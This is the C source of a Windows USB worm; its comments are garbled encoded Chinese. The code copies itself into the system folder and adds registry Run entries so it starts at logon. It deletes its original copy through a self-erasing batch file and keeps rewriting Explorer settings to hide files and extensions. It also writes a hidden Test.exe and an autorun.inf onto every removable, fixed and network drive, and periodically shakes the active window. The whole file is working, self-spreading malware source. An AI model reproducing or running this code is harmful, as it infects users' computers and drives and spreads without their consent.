#include <windows.h>
#include <stdio.h>
void Del();  //��ɾ��
int Ganran(int i);    // ��Ⱦģ��
void WINAPI ScanDisk();  // ʵʱ���U��
void WINAPI ScanRege();  // ʵʱ�޸�ע���
void WINAPI Root();   // ��������������һЩ������ ������չ�� ����Ϊ�̺߳���
char FileDirSystem[MAX_PATH];  // Դ����������λ��
char FileName[MAX_PATH]; // �������� ����·��
  
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
//////////////////////////////////////////////////////////////////////////
// ����������ʱ��С©��������ʧ
GetInputState();
PostThreadMessage(GetCurrentThreadId(),NULL,0,0);
MSG msg;
GetMessage(&msg, NULL, NULL, NULL);
//////////////////////////////////////////////////////////////////////////
GetModuleFileName(NULL,FileName,MAX_PATH);
GetSystemDirectory(FileDirSystem,MAX_PATH);
strcat(FileDirSystem,"\\snss.exe");   
if (strcmp(FileDirSystem,FileName))     // ����ϵͳĿ¼����и�Ⱦ
  Ganran(1);
else
{
  // ����һ���߳������޸� ��ʾ����ϵͳ�ļ�����չ����ѡ��
  // ������ô�ҵ���  �ٺ�
   CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)ScanRege,NULL,NULL,NULL);
  // ����һ���߳�����ʵʱ���U��
  // ��һ��U�� �͵ô��㶫����
  CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)ScanDisk,NULL,NULL,NULL);
  // Ϊ�������������� Ӱ��������������� �����߳���ȥ����Լ�DIY�Ĺ��ܰ�
  CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)Root,NULL,NULL,NULL);

// ԭ���� ���߳�Ӧ����Ҫ�ﵽ ��������ߵ�Ŀ�İ�    �r(�s���t)�q û�취 ˭����������
  Sleep(999999999); // ���߳̽���˯��״̬ ���� �Ǹúú���Ϣ��
  Sleep(999999999);
  Sleep(999999999); // Ū�༸�� �ٺ�
  
}
return 0;
}
/********************************************************/
//  �����ʲô��������������Ӵ��� �Լ����Ű��
/********************************************************/
void WINAPI Root()
{
do
{
  Sleep(10000); // û�¸� ÿ��10 �� ��һ�´��� �Ż��Ż�����
  HWND ForeHandle=GetForegroundWindow();
  for(int i=0;i<15;i++)
  {
   RECT rc;
   GetWindowRect(ForeHandle,&rc);
   MoveWindow(ForeHandle,rc.left+8,rc.top+8,rc.right-rc.left,rc.bottom-rc.top,1);
   Sleep(40);
   MoveWindow(ForeHandle,rc.left,rc.top,rc.right-rc.left,rc.bottom-rc.top,1);
   Sleep(40);
   Beep(0x0fff,10);
  }
} while (1);
}

/********************************************************/
//  ��Ⱦģ��
/********************************************************/
int Ganran(int i)
{
if (i)   //  ��Ⱦϵͳ
{
  CopyFile(FileName,FileDirSystem,FALSE); // �������Ը�����ϵͳĿ¼
  SetFileAttributes(FileDirSystem,FILE_ATTRIBUTE_HIDDEN);
  HKEY RegKey;
   // ����������
  RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
   0, KEY_ALL_ACCESS, &RegKey);
  RegSetValueEx(RegKey, "ctfmonn", 0, REG_SZ, (const BYTE *)&FileDirSystem, MAX_PATH);
  RegCloseKey(RegKey);
  RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
   0, KEY_ALL_ACCESS, &RegKey);
  RegSetValueEx(RegKey, "ctfmonn", 0, REG_SZ, (const BYTE *)&FileDirSystem, MAX_PATH);
  RegCloseKey(RegKey);
  ShellExecute(NULL,"open",FileDirSystem,0,0,SW_HIDE);   // ִ��
  Del(); // �Բ�
  return 1;
}
else // ��ȾU��
{
  strcat(FileName,"Test.exe");
  FILE *fp;  
  if ((fp=fopen(FileName,"r"))!=NULL) // ��ⲡ���Ƿ���� �����ظ���Ⱦ
  {
   fclose(fp);
   return 1;
  }
  CopyFile(FileDirSystem,FileName,FALSE); // ���������Ը��Ƶ�U��
  SetFileAttributes(FileName,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_READONLY|FILE_ATTRIBUTE_SYSTEM);
  FileName[2]='\0';
  strcat(FileName,"\\autorun.inf");
  if ((fp=fopen(FileName,"w+"))!=NULL)  // д��autorun.inf�ļ�
  {
      fputs("[AutoRun]\n",fp);
   fputs("OPEN=Test.exe\n",fp);
    fputs("shell\open=��(&O)\n",fp);
    fputs("shell\open\Command=Test.exe\n",fp);
   fputs("shell\open\Default=1\n",fp);
   fputs("shell\explore=��Դ������(&X)\n",fp);
   fputs("shell\explore\Command=Test.exe",fp);
   fclose(fp);
   SetFileAttributes(FileName,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_READONLY|FILE_ATTRIBUTE_SYSTEM);
  }
  else // �޷�д���򷵻� Ҫô�ж�����Ҫô�Ѿ�������
   return 1;
}
}
/********************************************************/
//  ��ɾ������   
/********************************************************/
void Del()
{
FILE *fp;
fp=fopen("C:\\system.bat","w+");
fprintf(fp,"@echo off \n");
fprintf(fp,":statr\nif not exist \"%s\" goto done\n",FileName);
fprintf(fp,"del /f /q \"%s\" \n",FileName);
fprintf(fp,"goto statr\n");
fprintf(fp,":done\n");
fprintf(fp,"del /f /q %%0\n");
fclose(fp);
ShellExecute(NULL,"open","C:\\system.bat",0,0,SW_HIDE);
}
/********************************************************/
//  �޸�ע���   ������ ������û�� ����˵����
/********************************************************/
void WINAPI ScanRege()  // ʵʱ�޸�ע���
{
HKEY RegKey;
DWORD tmp1 = 1; // ��չ�� 1����  0��ʾ
DWORD tmp2 = 2;  //Hidden 2 ����   1 ��ʾ�����ļ�
DWORD tmp0 = 0;  //ShowSuperHidden 0 ����  1��ʾ
do
{  
  RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL",
   0, KEY_ALL_ACCESS, &RegKey);
  RegSetValueEx(RegKey, "CheckedValue", 0, REG_DWORD, (const BYTE *)&tmp1, sizeof(tmp1));
  RegCloseKey( RegKey );
  
  RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced",
   0, KEY_ALL_ACCESS, &RegKey);
  RegSetValueEx(RegKey, "Hidden", 0, REG_DWORD, (const BYTE *)&tmp2, sizeof(tmp2));
  RegSetValueEx(RegKey, "ShowSuperHidden", 0, REG_DWORD, (const BYTE *)&tmp0, sizeof(tmp0));
  RegSetValueEx(RegKey, "HideFileExt", 0, REG_DWORD, (const BYTE *)&tmp1, sizeof(tmp1));
  RegCloseKey( RegKey );
  
} while (1);
}
/********************************************************/
//  ʵʱ���U�̣�����U���������и�Ⱦ
/********************************************************/
void WINAPI ScanDisk()  // ʵʱ���U��   USB ������
{
char szDriverName[MAX_PATH];
do
{
  strcpy(szDriverName, "C:\0");

  Sleep(1000); // ÿ����һ��  ����̫����ϵͳ��Դ
  for( szDriverName[0] = 'C'; szDriverName[0] < 'Z'; szDriverName[0]++ )
  {
   // ��Ⱦ �ƶ����̡��̶����̡��������  �����������͵��� ֻҪ��д ���з� ��
   if( GetDriveType( szDriverName ) == DRIVE_REMOVABLE || GetDriveType( szDriverName ) == DRIVE_FIXED || GetDriveType( szDriverName ) == DRIVE_REMOTE)
   {
     strcpy(FileName,szDriverName);     
     Ganran(0);
   }
  }
} while (1);
  
}
